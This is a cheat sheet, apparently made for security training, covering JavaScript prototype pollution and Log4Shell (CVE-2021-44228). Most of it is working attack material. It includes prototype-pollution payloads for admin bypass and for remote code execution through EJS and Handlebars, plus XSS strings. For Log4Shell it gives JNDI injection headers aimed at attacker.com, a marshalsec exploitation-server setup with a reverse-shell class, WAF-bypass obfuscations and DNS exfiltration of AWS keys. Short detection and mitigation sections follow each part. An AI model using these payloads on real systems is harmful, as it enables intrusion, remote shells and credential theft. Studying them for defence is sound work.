Prototype pollution is a JavaScript vulnerability where an attacker modifies the prototype of a base object (Object.prototype), affecting all objects in the application.

**How It Works:**
```javascript
// JavaScript prototype chain
const obj = {};
obj.__proto__ === Object.prototype; // true

// If attacker can set __proto__ properties:
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// Now ALL objects inherit isAdmin
const user = {};
console.log(user.isAdmin); // true!
```

**Vulnerable Merge Functions:**
```javascript
// Common vulnerable pattern
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Exploitation:
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
console.log({}.polluted); // true
```

**Server-Side Exploitation (Node.js):**

**1. Authentication Bypass:**
```json
// POST /api/user/update
{"__proto__": {"role": "admin", "isAdmin": true}}

// If app checks: if (user.isAdmin) { grantAccess(); }
// user.isAdmin is now true via prototype
```

**2. RCE via child_process:**
```json
// Pollute options passed to child_process.exec/spawn
{"__proto__": {"shell": true, "NODE_OPTIONS": "--require /proc/self/environ"}}

// Or via environment variables
{"__proto__": {"env": {"NODE_OPTIONS": "--require=./malicious.js"}}}
```

**3. RCE via EJS Template Engine:**
```json
// Pollute EJS options
{"__proto__": {
    "outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id > /tmp/pwned');var __tmp2"
}}
// When EJS renders any template, it executes the injected code
```

**4. RCE via Handlebars:**
```json
{"__proto__": {
    "type": "Program",
    "body": [{
        "type": "MustacheStatement",
        "path": {"type": "PathExpression", "parts": ["constructor"]},
        "params": [{"type": "StringLiteral", "value": "return require('child_process').execSync('id')"}]
    }]
}}
```

**Client-Side Exploitation:**
```javascript
// XSS via prototype pollution
// If library reads from prototype for HTML generation
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Or pollute jQuery/DOM manipulation
Object.prototype.src = 'javascript:alert(1)';
```

**Detection:**
```bash
# Find vulnerable dependencies
npm audit
snyk test

# Check for merge/extend functions
grep -rn 'merge\|extend\|assign\|deepCopy' node_modules/ --include='*.js'
```

**Prevention:**
- Freeze Object.prototype: `Object.freeze(Object.prototype)`
- Use `Map` instead of plain objects for user data
- Validate keys: reject `__proto__`, `constructor`, `prototype`
- Use `Object.create(null)` for dictionary objects
- Keep dependencies updated (npm audit fix)

Log4Shell (CVE-2021-44228) is a critical RCE vulnerability in Apache Log4j 2.x that exploits JNDI lookup functionality.

**Basic Payload:**
```
${jndi:ldap://attacker.com:1389/exploit}
${jndi:rmi://attacker.com:1099/exploit}
${jndi:dns://attacker.com/test}
```

**Injection Points (any logged input):**
```http
# HTTP Headers
User-Agent: ${jndi:ldap://attacker.com/ua}
X-Forwarded-For: ${jndi:ldap://attacker.com/xff}
Referer: ${jndi:ldap://attacker.com/ref}
Cookie: session=${jndi:ldap://attacker.com/cookie}
Authorization: Basic ${jndi:ldap://attacker.com/auth}

# URL parameters
/search?q=${jndi:ldap://attacker.com/q}

# Form data, JSON bodies, anywhere user input is logged
{"username": "${jndi:ldap://attacker.com/user}"}
```

**Setting Up Exploitation Server:**
```bash
# 1. Create malicious Java class
javac Exploit.java
# Exploit.java:
# public class Exploit {
#   static { Runtime.getRuntime().exec("bash -c {echo,base64_reverse_shell}|{base64,-d}|bash"); }
# }

# 2. Host exploit class
python3 -m http.server 8888

# 3. Start LDAP server (marshalsec)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit" 1389

# 4. Send payload
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com:1389/exploit}' https://target.com/
```

**WAF Bypass Payloads:**
```
${${lower:j}ndi:${lower:l}dap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/x}
${jndi:ldap://attacker.com/x}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}mi://attacker.com/x}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://attacker.com/x}
```

**Data Exfiltration without RCE:**
```
${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
${jndi:ldap://${env:HOSTNAME}.attacker.com}
${jndi:dns://${hostName}.attacker.com}
```

**Detection:**
```bash
# Scan for vulnerable Log4j versions
find / -name 'log4j-core-*.jar' 2>/dev/null
# Use log4j-scan tool
python3 log4j-scan.py -u https://target.com --headers-file headers.txt

# Check logs for exploitation attempts
grep -rE '\$\{jndi:' /var/log/
```

**Mitigation:**
- Upgrade to Log4j 2.17.1+ (removes JNDI lookup entirely)
- Set `log4j2.formatMsgNoLookups=true`
- Remove JndiLookup.class: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- Block outbound LDAP/RMI at firewall level
- Use Java Security Manager to restrict JNDI
